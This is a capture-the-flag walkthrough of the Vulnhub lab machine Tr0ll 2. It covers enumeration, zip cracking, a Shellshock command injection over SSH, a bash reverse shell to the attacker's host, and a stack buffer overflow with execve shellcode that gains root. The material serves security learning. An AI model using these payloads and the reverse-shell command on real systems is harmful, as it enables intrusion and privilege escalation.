---
title: Troll 2 Vunhub Machine Writeup and Walkthrough
author: Gaurav Raj
date: 2021-06-26 15:15:00 +0530
categories: [CTF, Vulnhub]
tags: [ctf, vulnhub, boot2root, writeup, walkthrough, johntheripper, zip2john, gdb, ftp, ssh, python, python3, buffer overflow, stack based buffer overflow, shellcode, shellcoding, thehackersbrain, hackersbrain, gaurav raj]

---


## Troll: 2
> OSCP Labs Inspired Machine on Vulnhub

## Configuration
Extracted the `Tr0ll2.rar` file and then opened it as a new machine in **`VM Ware Player`** and the network configuration is `Bridged Network`.

## Finding the Target.
```shell-session
[elliot@archlinux]  troll2 git:(main) ✗ sudo nmap -sS -v 192.168.225.1/24
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-26 23:28 IST
Nmap scan report for Tr0ll2 (192.168.225.188)
Host is up (0.011s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
MAC Address: DC:F5:05:D6:F5:5F (AzureWave Technology)

[elliot@archlinux]  troll2 git:(main) ✗
```

## Target IP
```bash
export IP=192.168.225.188
```

## Enumeration

### Nmap Scan
```shell-session
# Nmap 7.91 scan initiated Sat Jun 26 23:32:13 2021 as: nmap -sC -sV -A -v -oN nmap/initial 192.168.225.188
Nmap scan report for Tr0ll2 (192.168.225.188)
Host is up (0.0036s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 82:fe:93:b8:fb:38:a6:77:b5:a6:25:78:6b:35:e2:a8 (DSA)
|   2048 7d:a5:99:b8:fb:67:65:c9:64:86:aa:2c:d6:ca:08:5d (RSA)
|_  256 91:b8:6a:45:be:41:fd:c8:14:b5:02:a0:66:7c:8c:96 (ECDSA)
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: Host: Tr0ll; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jun 26 23:32:28 2021 -- 1 IP address (1 host up) scanned in 14.35 seconds

```

So as from the Nmap Scan Results, we have 3 ports opened. but unfortunately anonymous login is disabled on the **`FTP`** Server. So let's head to the **HTTP** Server.

### HTTP Port (80)
And here we go again we have the same troll page from the first `troll` machine.
![](/assets/troll2/Pasted image 20210626233720.png)

and here's the source
```html
<html>
<img src='tr0ll_again.jpg'>
</html>
<!--Nothing here, Try Harder!>
<!--Author: Tr0ll>
<!--Editor: VIM>
```

#### Directory Fuzzing using FFUF
```shell-session
[elliot@archlinux]  troll2 git:(main) ✗ ffuf -w /usr/share/wordlists/dirb/common.txt:FUZZ -u http://192.168.225.188/FUZZ -recursion -recursion-depth 1 | tee dir_brute.log

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.225.188/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

.htpasswd               [Status: 403, Size: 292, Words: 21, Lines: 11, Duration: 14ms]
.htaccess               [Status: 403, Size: 292, Words: 21, Lines: 11, Duration: 16ms]
                        [Status: 200, Size: 110, Words: 7, Lines: 7, Duration: 18ms]
.hta                    [Status: 403, Size: 287, Words: 21, Lines: 11, Duration: 137ms]
cgi-bin/                [Status: 403, Size: 291, Words: 21, Lines: 11, Duration: 11ms]
index.html              [Status: 200, Size: 110, Words: 7, Lines: 7, Duration: 6ms]
index                   [Status: 200, Size: 110, Words: 7, Lines: 7, Duration: 15ms]
robots                  [Status: 200, Size: 346, Words: 1, Lines: 24, Duration: 6ms]
robots.txt              [Status: 200, Size: 346, Words: 1, Lines: 24, Duration: 6ms]
server-status           [Status: 403, Size: 296, Words: 21, Lines: 11, Duration: 8ms]
:: Progress: [4614/4614] :: Job [1/1] :: 2875 req/sec :: Duration: [0:00:01] :: Errors: 0 ::
[elliot@archlinux]  troll2 git:(main) ✗ 
```

we now have `robots.txt` file, which contains potential directory list.
```bash
User-agent:*
Disallow:
/noob
/nope
/try_harder
/keep_trying
/isnt_this_annoying
/nothing_here
/404
/LOL_at_the_last_one
/trolling_is_fun
/zomg_is_this_it
/you_found_me
/I_know_this_sucks
/You_could_give_up
/dont_bother
/will_it_ever_end
/I_hope_you_scripted_this
/ok_this_is_it
/stop_whining
/why_are_you_still_looking
/just_quit
/seriously_stop
```

here's the list of valid directories we found on the server using the directory names in the `robots.txt` directory.

##### FFUF Scan
```shell-session
[elliot@archlinux]  troll2 git:(main) ✗ ffuf -w robots.txt:FUZZ -u http://192.168.225.188/FUZZ -recursion -recursion-depth 2 | tee dir_brute_robots.log

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.225.188/FUZZ
 :: Wordlist         : FUZZ: robots.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

/ok_this_is_it          [Status: 301, Size: 326, Words: 20, Lines: 10, Duration: 3ms]
/keep_trying            [Status: 301, Size: 324, Words: 20, Lines: 10, Duration: 7ms]
/noob                   [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 10ms]
/dont_bother            [Status: 301, Size: 324, Words: 20, Lines: 10, Duration: 11ms]
:: Progress: [21/21] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
```

So, now we have four directory, and there's nothing there. but there's a image which is same on all pages, so I downloaded Image and then tried to see if there's some data inside that.
![](/assets/troll2/Pasted image 20210627001759.png)

#### Stegoveritas Image Data
So tried running `stegoveritas` against the image, and here we found a file named `trailing_data.bin` and there's the content of the file.
```bash
(env) [elliot@archlinux]  results git:(main) ✗ cat trailing_data.bin 
Look Deep within y0ur_self for the answer
```

the `y0ur_self` word looks kind of interesting, so I tried to see if there's any directory named this on the **HTTP** Server and **BOOM!** I was Right.

at that endpoint, found a file named `answer.txt` which was some sort of wordlist encoded in base64 with some repeatetive values, so I decoded the wordlist, sorted by uniq and then redirected into other file.
```bash
cat answer.txt | sort -u | base64 -d > answer_decoded.txt
```

### FTP Enumeration
After banging my head against the wall for quite a while and bruteforcing the **FTP** and **SSH** with the provided wordlist, finally figured out that the credentials for the **FTP** Server was `Tr0ll:Tr0ll`. Damn! that was exausting.

Credentials:
```bash
FTP Credentials: Tr0ll:Tr0ll
```

#### Getting Access
After logging in on the **FTP** Server, found a file named `lmao.zip`, let's download and analyze it.

```shell-session
(env) [elliot@archlinux]  troll2 git:(main) ✗ ftp 192.168.225.188
Connected to 192.168.225.188.
220 Welcome to Tr0ll FTP... Only noobs stay for a while...
Name (192.168.225.188:elliot): Tr0ll
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -al
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Oct 04  2014 .
drwxr-xr-x    2 0        0            4096 Oct 04  2014 ..
-rw-r--r--    1 0        0            1474 Oct 04  2014 lmao.zip
226 Directory send OK.
ftp> cd ..
250 Directory successfully changed.
ftp> pwd
257 "/"
ftp> ls -al
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Oct 04  2014 .
drwxr-xr-x    2 0        0            4096 Oct 04  2014 ..
-rw-r--r--    1 0        0            1474 Oct 04  2014 lmao.zip
226 Directory send OK.
ftp> get lmao.zip
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for lmao.zip (1474 bytes).
226 Transfer complete.
1474 bytes received in 0.000415 seconds (3.39 Mbytes/s)
ftp> 
```

So while analyzing the `lmao.zip` file as expected, it was password protected and we don't know that password, so let's crack it.

```shell-session
(env) [elliot@archlinux]  lmao git:(main) ✗ unzip lmao.zip           
Archive:  lmao.zip
[lmao.zip] noob password: 
password incorrect--reenter: 
password incorrect--reenter: 
   skipping: noob                    incorrect password
```

##### Password Cracking with John
So here we cracked that password of the zip file using `JohnTheRipper`.

```shell-session
(env) [elliot@archlinux]  lmao git:(main) ✗ zip2john lmao.zip > ziphash
ver 2.0 efh 5455 efh 7875 lmao.zip/noob PKZIP Encr: 2b chk, TS_chk, cmplen=1300, decmplen=1679, crc=70E48BAD
(env) [elliot@archlinux]  lmao git:(main) ✗ john --wordlist=answer_decoded.txt ziphash
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ItCantReallyBeThisEasyRightLOL (lmao.zip/noob)
1g 0:00:00:00 DONE (2021-06-27 00:53) 3.030g/s 148945p/s 148945c/s 148945C/s Guatemala..commends
Use the "--show" option to display all of the cracked passwords reliably
Session completed
(env) [elliot@archlinux]  lmao git:(main) ✗ 
```

after unzipping the zip file found a file called `noob` which was actually a private ssh key so, tried to ssh into the box with username `noob`. here's what happed.

```shell-session
(env) [elliot@archlinux]  lmao git:(main) ✗ chmod 600 noob       
(env) [elliot@archlinux]  lmao git:(main) ✗ ssh -i noob noob@192.168.225.188
The authenticity of host '192.168.225.188 (192.168.225.188)' can't be established.
ECDSA key fingerprint is SHA256:I3xuSgcBlIsoldKTkOyVYwx8B4NLGl0fDDTi0H6ExYg.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.225.188' (ECDSA) to the list of known hosts.
TRY HARDER LOL!
Connection to 192.168.225.188 closed.
(env) [elliot@archlinux]  lmao git:(main) ✗
```

after ssh-ing into the machine, the session died immediately with the message **`TRY HARDER LOL!`**, that's hilarious.

Let's Try Harder.

## Getting Access
As we now have the private **`SSH`** Key of user `noob`, we can try some methods to exploit the ssh server. here's the one I found and worked for me called `SSH Bash Shellshock Exploit` [here](https://www.youtube.com/watch?v=blaui7SZQJ4)

```shell-session
(env) [elliot@archlinux]  lmao git:(main) ✗ ssh -i noob noob@192.168.225.188 '() { :;}; cat /etc/passwd'
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
messagebus:x:102:104::/var/run/dbus:/bin/false
maleus:x:1000:1000:Tr0ll,,,:/home/maleus:/bin/bash
sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
ftp:x:104:111:ftp daemon,,,:/srv/ftp:/bin/false
noob:x:1002:1002::/home/noob:/bin/bash
Tr0ll:x:1001:1001::/home/tr0ll:/bin/false
```

and that we can run our commands, let's get a reverse shell

command
```shell-session
(env) [elliot@archlinux]  lmao git:(main) ✗ ssh -i noob noob@192.168.225.188 '() { :;}; bash -i >& /dev/tcp/192.168.225.43/4444 0>&1'
```

listener
```shell-session
[elliot@archlinux]  troll2 git:(main) ✗ nc -nvlp 4444
Connection from 192.168.225.188:46614
bash: no job control in this shell
noob@Tr0ll2:~$ 
```

while enumerating the machine, there's a directory named `/nothing_to_see_here/` inside the /root of the filesytem. There's a directory inside that as well named `/nothing_to_see_here/choose_wisely/` where we have three more directories named `door1`, `door2` and `door3` containing a binary named `r00t` inside all of them.

#### Binaries
1. First Binary
here's the `strings` output of first binary

```shell-session
Good job, stand by, executing root shell...
BUHAHAHA NOOB!
/sbin/reboot
```
this binary will simply reboot the target machine.

2. Second Binary
`strings` output of second binary

```shell-session
2 MINUTE HARD MODE LOL
/bin/chmod 600 /bin/ls
/bin/chmod 777 /bin/ls
```
this binary will change the permission of the `ls` binary

3. Third Binary
Simply running strings didn't get any interesting result, so here's the source of the main function.


```c
int main(int argc,char **argv) {
  int iVar1;
  char buf [256];
  char local_110 [268];
  
  if (argc == 1) {
    printf("Usage: %s input\n",*argv);
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  strcpy(local_110,argv[1]);
  iVar1 = printf("%s",local_110);
  return iVar1;
}

```


turns out that this is a simple buffer overflow vulnerable binary, which we have to exploit in order to get the root shell. Beware while working with these binaries.

### Segmentation fault PoC
```shell-session
(gdb) run $(python -c "print 'A'*269")
Starting program: /nothing_to_see_here/choose_wisely/door3/r00t $(python -c "print 'A'*269")

Program received signal SIGSEGV, Segmentation fault.
0xb7e40041 in ?? () from /lib/i386-linux-gnu/libc.so.6
```

### Creating the Pattern

```shell-session
[elliot@archlinux]  troll2 git:(main) ✗ /opt/metasploit/tools/exploit/pattern_create.rb -l 270               
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9
[elliot@archlinux]  troll2 git:(main) ✗ 
```

### Find the offset

#### Sending the pattern
```shell-session
(gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9

Starting program: /nothing_to_see_here/choose_wisely/door3/r00t Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9

Program received signal SIGSEGV, Segmentation fault.
0xb7003969 in ?? ()
(gdb) info register esp
esp            0xbffffb70	0xbffffb70
(gdb) 
```

#### Offset
```shell-session
[elliot@archlinux]  troll2 git:(main) ✗ /opt/metasploit/tools/exploit/pattern_offset.rb -q 0xb7003969
[*] Exact match at offset 268
```

### Shellcode
As we know from the binary file that the system is using `i386-linux-gnu` and `x86` which is `32 Bit` System architecture, so instead of writing the shellcode on our [here](http://shell-storm.org/shellcode/files/shellcode-827.php) it found a public shellcode.

ShellCode
```bash
    *****************************************************
    *    Linux/x86 execve /bin/sh shellcode 23 bytes    *
    *****************************************************
    *	  	  Author: Hamza Megahed		        *
    *****************************************************
    *             Twitter: @Hamza_Mega                  *
    *****************************************************
    *     blog: hamza-mega[dot]blogspot[dot]com         *
    *****************************************************
    *   E-mail: hamza[dot]megahed[at]gmail[dot]com      *
    *****************************************************

xor    %eax,%eax
push   %eax
push   $0x68732f2f
push   $0x6e69622f
mov    %esp,%ebx
push   %eax
push   %ebx
mov    %esp,%ecx
mov    $0xb,%al
int    $0x80

********************************
#include <stdio.h>
#include <string.h>
 
char *shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
		  "\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";

int main(void)
{
fprintf(stdout,"Length: %d\n",strlen(shellcode));
(*(void(*)()) shellcode)();
return 0;
}
```

### Exploiting the Binary
```bash
env - ./r00t $(python -c 'print "A" * 268 + "\x70\xfb\xff\xbf" + "\x90" * 10 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')
```

#### Running Exploit on Wrong Binary
Another nice trick played, the binaries are changing its places, so here's what happens when you run the exploit on the wrong binary

```shell-session
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2$ env - ./r00t $(python -c 'print "A" * 268 + "\x70\xfc\xff\xbf" + "\x90" * 10 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')
Good job, stand by, executing root shell...
BUHAHAHA NOOB!
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2$
```

So the way to find the right binary is to look at the **`size`** of the binary files, the binary with biggest size is our target.

```shell-session
noob@Tr0ll2:/nothing_to_see_here/choose_wisely$ ls -al door*
door1:
total 20
drwsr-xr-x 2 root root 4096 Oct  5  2014 .
drwsr-xr-x 5 root root 4096 Oct  4  2014 ..
-rwsr-xr-x 1 root root 8401 Oct  5  2014 r00t

door2:
total 16
drwsr-xr-x 2 root root 4096 Oct  4  2014 .
drwsr-xr-x 5 root root 4096 Oct  4  2014 ..
-rwsr-xr-x 1 root root 7271 Oct  4  2014 r00t

door3:
total 16
drwsr-xr-x 2 root root 4096 Oct  5  2014 .
drwsr-xr-x 5 root root 4096 Oct  4  2014 ..
-rwsr-xr-x 1 root root 7273 Oct  5  2014 r00t
noob@Tr0ll2:/nothing_to_see_here/choose_wisely$ 
```

So, In my case our target binary is in the `door1` directory. let's run the exploit on that binary.

### Environment Fault
After running the exploit against the right binary there's an error stating **`Illegal instruction`**. 

```shell-session
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door1$ ./r00t $(python -c 'print "A" * 268 + "\x70\xfc\xff\xbf" + "\x90" * 10 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')
Illegal instruction
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door1$
```

So, the problem is that the actual machine's environment is different than the one inside of the **`GDB`**.<br/>
So, for avoiding the error all we have to do is to shift the address of esp from 1 bit. `\xbffffb70` to `\xbffffb80`. let's run the exploit again after making the changes.

```shell-session
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door1$ env - ./r00t $(python -c 'print "A" * 268 + "\x80\xfc\xff\xbf" + "\x90" * 10 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')

# id
id
uid=1002(noob) gid=1002(noob) euid=0(root) groups=0(root),1
002(noob)

# cat /root/Proof.txt
cat /root/Proof.txt
You win this time young Jedi...

a70354f0258dcc00292c72aab3c8b1e4
```

## Root Flag
```bash
a70354f0258dcc00292c72aab3c8b1e4
```

and here we completed the machine.
